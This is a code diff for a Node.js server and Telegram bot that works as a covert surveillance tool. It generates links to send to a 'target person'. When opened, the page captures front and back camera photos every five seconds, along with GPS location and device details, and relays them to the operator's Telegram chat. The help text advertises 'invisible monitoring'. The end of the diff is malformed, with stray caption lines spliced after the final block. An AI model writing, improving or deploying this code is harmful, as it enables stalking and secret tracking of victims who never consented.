@@ -8,10 +8,13 @@ const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Telegram Bot Setup
+// Telegram Bot Setup (No polling for Render)
 const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
 
-// Auto-detect webhook URL from request
+// Store for user sessions
+const userSessions = new Map();
+
+// Auto-detect and set webhook
 app.use((req, res, next) => {
   if (!global.webhookSet && req.get('host')) {
     const protocol = req.protocol || 'https';
@@ -19,7 +22,7 @@ app.use((req, res, next) => {
     
     bot.setWebHook(webhookUrl)
       .then(() => {
-        console.log('✅ Webhook auto-set:', webhookUrl);
+        console.log('✅ Webhook set:', webhookUrl);
         global.webhookSet = true;
       })
       .catch(err => console.error('❌ Webhook error:', err.message));
@@ -27,10 +30,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Store for user sessions
-const userSessions = new Map();
-
-// Multer setup
+// Multer setup for file uploads
 const storage = multer.diskStorage({
   destination: (req, file, cb) => {
     const uploadsDir = 'uploads';
@@ -53,57 +53,327 @@ const upload = multer({
 app.use(express.json({ limit: '10mb' }));
 app.use(express.static('public'));
 
-// Webhook endpoint
+// Telegram webhook endpoint
 app.post(`/bot${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
   bot.processUpdate(req.body);
   res.sendStatus(200);
 });
 
-// Routes
+// Main page route
 app.get('/', (req, res) => {
   const indexPath = path.join(__dirname, 'public', 'index.html');
   if (fs.existsSync(indexPath)) {
     res.sendFile(indexPath);
   } else {
-    res.status(404).send('❌ index.html not found. Create public/index.html file!');
+    res.status(404).send('index.html not found! Please create public/index.html');
   }
 });
 
+// Health check endpoint
 app.get('/health', (req, res) => {
   res.json({ 
     status: 'ok',
     bot: !!process.env.TELEGRAM_BOT_TOKEN,
     webhook: global.webhookSet || false,
     host: req.get('host'),
+    sessions: userSessions.size,
     timestamp: new Date().toISOString()
   });
 });
 
 // Upload photo endpoint
 app.post('/upload-photo', upload.single('photo'), async (req, res) => {
-  console.log('📸 Upload request');
+  console.log('📸 Photo upload request received');
   
   try {
     if (!req.file) {
-      return res.status(400).json({ success: false, error: 'No photo' });
+      return res.status(400).json({ 
+        success: false, 
+        error: 'No photo received' 
+      });
     }
 
     const { sessionId, cameraType, location, browserInfo } = req.body;
-    const session = userSessions.get(sessionId);
     
+    // Get session
+    const session = userSessions.get(sessionId);
     if (!session) {
-      return res.status(404).json({ success: false, error: 'Invalid session' });
+      console.log('❌ Invalid session:', sessionId);
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Invalid session' 
+      });
     }
 
     const chatId = session.chatId;
     const photoPath = req.file.path;
+
+    // Parse data
     const locationData = location ? JSON.parse(location) : null;
     const browserData = browserInfo ? JSON.parse(browserInfo) : {};
 
-    let caption = `📸 *Photo Captured*\n\n`;
-    caption += `📷 ${cameraType === 'front' ? 'Front' : 'Back'} Camera\n`;
+    // Create caption
+    let caption = `📸 *New Photo Captured*\n\n`;
+    caption += `📷 Camera: ${cameraType === 'front' ? 'Front 🤳' : 'Back 📱'}\n`;
     caption += `🆔 Session: \`${sessionId}\`\n`;
-    caption += `📊 #${session.captures + 1}\n\n`;
+    caption += `📊 Capture #${session.captures + 1}\n\n`;
+
+    if (locationData && locationData.latitude) {
+      caption += `📍 *Location:*\n`;
+      caption += `Lat: \`${locationData.latitude.toFixed(6)}\`\n`;
+      caption += `Lng: \`${locationData.longitude.toFixed(6)}\`\n`;
+      caption += `Accuracy: ${locationData.accuracy.toFixed(0)}m\n\n`;
+    }
+
+    caption += `💻 *Device:*\n`;
+    caption += `Platform: ${browserData.platform || 'Unknown'}\n`;
+    caption += `Screen: ${browserData.screenWidth}x${browserData.screenHeight}\n`;
+    caption += `Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n`;
+
+    // Send photo to Telegram
+    console.log(`📤 Sending to chat: ${chatId}`);
+    
+    await bot.sendPhoto(chatId, fs.createReadStream(photoPath), {
+      caption: caption,
+      parse_mode: 'Markdown'
+    });
+
+    console.log('✅ Photo sent');
+
+    // Send location if available
+    if (locationData && locationData.latitude) {
+      await bot.sendLocation(chatId, locationData.latitude, locationData.longitude);
+      console.log('✅ Location sent');
+    }
+
+    // Update session
+    session.captures++;
+    session.lastCapture = new Date();
+
+    // Delete temp file
+    fs.unlinkSync(photoPath);
+
+    res.json({ 
+      success: true, 
+      message: 'Photo sent to Telegram',
+      captureNumber: session.captures
+    });
+
+  } catch (error) {
+    console.error('❌ Error:', error);
+    
+    if (req.file && fs.existsSync(req.file.path)) {
+      fs.unlinkSync(req.file.path);
+    }
+    
+    res.status(500).json({ 
+      success: false, 
+      error: error.message 
+    });
+  }
+});
+
+// Telegram Bot Commands
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id;
+  
+  const welcomeMessage = `
+🔐 *Surveillance System Bot*
+
+Welcome! Generate surveillance links to capture photos remotely.
+
+*Commands:*
+/generatelink - Generate new link
+/sessions - View active sessions
+/help - Show help
+
+Click below to get started! 👇
+`;
+
+  bot.sendMessage(chatId, welcomeMessage, { 
+    parse_mode: 'Markdown',
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '🔗 Generate Link', callback_data: 'generate' }],
+        [{ text: '📊 View Sessions', callback_data: 'sessions' }]
+      ]
+    }
+  });
+});
+
+bot.onText(/\/generatelink/, (msg) => {
+  generateLink(msg.chat.id);
+});
+
+bot.onText(/\/sessions/, (msg) => {
+  showSessions(msg.chat.id);
+});
+
+bot.onText(/\/help/, (msg) => {
+  const chatId = msg.chat.id;
+  
+  const helpMessage = `
+📖 *Help Guide*
+
+*How to use:*
+1️⃣ Use /generatelink to create a surveillance link
+2️⃣ Send the link to target person
+3️⃣ When they open it:
+   • Loading screen appears
+   • Camera access requested
+   • Photos captured automatically
+   • Sent to you in real-time
+
+*Features:*
+✅ Front & back camera
+✅ GPS location tracking
+✅ Device information
+✅ Auto-capture every 5 seconds
+✅ Invisible monitoring
+
+⚠️ Use responsibly and legally only.
+`;
+
+  bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
+});
+
+// Handle callback queries
+bot.on('callback_query', (query) => {
+  const chatId = query.message.chat.id;
+  const data = query.data;
+
+  if (data === 'generate') {
+    generateLink(chatId);
+  } else if (data === 'sessions') {
+    showSessions(chatId);
+  }
+
+  bot.answerCallbackQuery(query.id);
+});
+
+// Generate link function
+function generateLink(chatId) {
+  const sessionId = Math.random().toString(36).substring(7);
+  const baseUrl = process.env.BASE_URL || 'https://your-app.onrender.com';
+  const link = `${baseUrl}/?session=${sessionId}`;
+  
+  userSessions.set(sessionId, {
+    chatId: chatId,
+    createdAt: new Date(),
+    captures: 0
+  });
+
+  console.log(`🔗 Link generated for chat ${chatId}: ${sessionId}`);
+
+  const message = `
+✅ *Link Generated Successfully!*
+
+🔗 *Surveillance Link:*
+\`${link}\`
+
+📋 Session ID: \`${sessionId}\`
+⏰ Created: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+
+*Instructions:*
+1. Copy and send this link
+2. Target opens the link
+3. Photos sent to you automatically
+
+*Features Active:*
+📸 Front & Back camera
+📍 GPS location
+💻 Device info
+🔄 Auto-capture every 5s
+`;
+
+  bot.sendMessage(chatId, message, { 
+    parse_mode: 'Markdown',
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '🔗 Open Link', url: link }],
+        [
+          { text: '🔄 New Link', callback_data: 'generate' },
+          { text: '📊 Sessions', callback_data: 'sessions' }
+        ]
+      ]
+    }
+  });
+}
+
+// Show sessions function
+function showSessions(chatId) {
+  const userSessionsList = Array.from(userSessions.entries())
+    .filter(([_, session]) => session.chatId === chatId);
+
+  if (userSessionsList.length === 0) {
+    bot.sendMessage(chatId, '📭 No active sessions.\n\nUse /generatelink to create one!', {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '🔗 Generate Link', callback_data: 'generate' }]
+        ]
+      }
+    });
+    return;
+  }
+
+  let message = `📊 *Your Active Sessions*\n\n`;
+  message += `Total: ${userSessionsList.length}\n\n`;
+  
+  userSessionsList.forEach(([sessionId, session], index) => {
+    message += `*${index + 1}. \`${sessionId}\`*\n`;
+    message += `   📸 Captures: ${session.captures}\n`;
+    message += `   ⏰ Created: ${session.createdAt.toLocaleTimeString()}\n`;
+    if (session.lastCapture) {
+      message += `   🕐 Last: ${session.lastCapture.toLocaleTimeString()}\n`;
+    }
+    message += `\n`;
+  });
+
+  bot.sendMessage(chatId, message, { 
+    parse_mode: 'Markdown',
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '🔗 New Link', callback_data: 'generate' }]
+      ]
+    }
+  });
+}
+
+// 404 handler
+app.use((req, res) => {
+  res.status(404).json({ 
+    error: 'Not found',
+    path: req.path
+  });
+});
+
+// Start server
+app.listen(PORT, '0.0.0.0', () => {
+  console.log('================================');
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📱 Bot token: ${process.env.TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Missing ❌'}`);
+  console.log(`📂 public folder: ${fs.existsSync('public') ? 'Found ✅' : 'Missing ❌'}`);
+  console.log(`📄 index.html: ${fs.existsSync('public/index.html') ? 'Found ✅' : 'Missing ❌'}`);
+  console.log('================================');
+});
+
+// Cleanup old sessions every hour
+setInterval(() => {
+  const now = new Date();
+  let cleaned = 0;
+  
+  for (const [sessionId, session] of userSessions.entries()) {
+    const age = now - session.createdAt;
+    if (age > 24 * 60 * 60 * 1000) {
+      userSessions.delete(sessionId);
+      cleaned++;
+    }
+  }
+  
+  if (cleaned > 0) {
+    console.log(`🗑️ Cleaned ${cleaned} old sessions`);
+  }
+}, 60 * 60 * 1000);    caption += `📊 #${session.captures + 1}\n\n`;
 
     if (locationData?.latitude) {
       caption += `📍 Location:\n`;
